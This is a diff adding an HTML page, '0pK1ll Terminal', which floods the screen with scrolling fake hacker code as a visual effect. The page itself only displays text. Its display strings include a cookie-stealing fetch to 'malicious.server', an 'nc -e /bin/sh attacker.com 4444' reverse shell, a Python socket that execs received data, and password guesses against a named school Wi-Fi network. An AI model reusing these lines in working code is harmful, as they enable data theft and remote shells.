@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>0pK1ll Terminal - Code Spew</title>
+  <style>
+    html, body {
+      margin: 0; padding: 0; height: 100%;
+      background-color: black;
+      color: #00ff00;
+      font-family: 'Courier New', monospace;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    #fullscreen-btn {
+      position: fixed;
+      top: 10px;
+      right: 10px;
+      z-index: 1000;
+      background: #111;
+      color: #0f0;
+      border: 1px solid #0f0;
+      padding: 5px 10px;
+      cursor: pointer;
+      user-select: none;
+    }
+
+    #terminal {
+      flex-grow: 1;
+      overflow-y: auto;
+      padding: 20px;
+      box-sizing: border-box;
+      white-space: pre;
+      line-height: 1.2em;
+    }
+
+    .output-line {
+      margin: 0 0 2px 0;
+    }
+  </style>
+</head>
+<body>
+  <button id="fullscreen-btn" title="Toggle Fullscreen">⛶ Fullscreen</button>
+  <div id="terminal" aria-live="polite" aria-atomic="false"></div>
+
+  <script>
+    const terminal = document.getElementById('terminal');
+    const fullscreenBtn = document.getElementById('fullscreen-btn');
+
+    // Array of fake realistic-ish code snippets
+    const codeLines = [
+      'const net = require("net");',
+      'function initSniffer() {',
+      '    let packets = capturePackets(interface);',
+      '    packets.forEach(packet => {',
+      '        if(packet.dest === targetIP) {',
+      '            decryptPacket(packet.payload);',
+      '        }',
+      '    });',
+      '}',
+      'var targetIP = "192.168.0.101";',
+      'let macAddress = "00:1A:2B:3C:4D:5E";',
+      'fetch("http://malicious.server/upload", {',
+      '    method: "POST",',
+      '    body: JSON.stringify({cookies: document.cookie})',
+      '});',
+      'for(let i=0; i < packets.length; i++) {',
+      '    if(packets[i].type === "auth") {',
+      '        sendPayload(packets[i]);',
+      '    }',
+      '}',
+      'let payload = "trojan_payload.dll";',
+      'executePayload(payload);',
+      'while(true) {',
+      '    console.log("Injecting backdoor...");',
+      '}',
+      'function escalatePrivileges() {',
+      '    let token = requestToken("SYSTEM");',
+      '    applyToken(token);',
+      '}',
+      'let ssid = "PUSD Student Wi-fi";',
+      'console.log(`Connecting to ${ssid}...`);',
+      '// TODO: Add keylogger functionality',
+      'import socket',
+      's = socket.socket(socket.AF_INET, socket.SOCK_STREAM)',
+      's.connect(("192.168.1.1", 4444))',
+      'while True:',
+      '    data = s.recv(1024)',
+      '    exec(data)',
+      'passwords = ["unicorn@school2024", "P@ssw0rd123", "letmein"];',
+      'for(const pw of passwords) {',
+      '    tryLogin(ssid, pw);',
+      '}',
+      'if(isConnected(ssid)) {',
+      '    console.log("Access granted!");',
+      '} else {',
+      '    console.log("Access denied!");',
+      '}',
+      '#include <stdio.h>',
+      'int main() {',
+      '    printf("Hacking in progress...\\n");',
+      '    return 0;',
+      '}',
+      'void injectShell() {',
+      '    system("/bin/sh");',
+      '}',
+      'const exec = require("child_process").exec;',
+      'exec("nc -e /bin/sh attacker.com 4444");',
+      '// End of script',
+    ];
+
+    let index = 0;
+
+    function spewCode() {
+      // Create new div line
+      const line = document.createElement('div');
+      line.classList.add('output-line');
+
+      // Add next code snippet
+      line.textContent = codeLines[index];
+      terminal.appendChild(line);
+
+      // Scroll to bottom
+      terminal.scrollTop = terminal.scrollHeight;
+
+      // Increment and loop index
+      index++;
+      if(index >= codeLines.length) index = 0;
+
+      // Repeat quickly to simulate code flood
+      setTimeout(spewCode, 80 + Math.random() * 50);
+    }
+
+    spewCode();
+
+    fullscreenBtn.addEventListener('click', () => {
+      if (!document.fullscreenElement) {
+        document.documentElement.requestFullscreen().catch(err => {
+          alert(`Fullscreen error: ${err.message}`);
+        });
+      } else {
+        document.exitFullscreen();
+      }
+    });
+  </script>
+</body>
+</html>
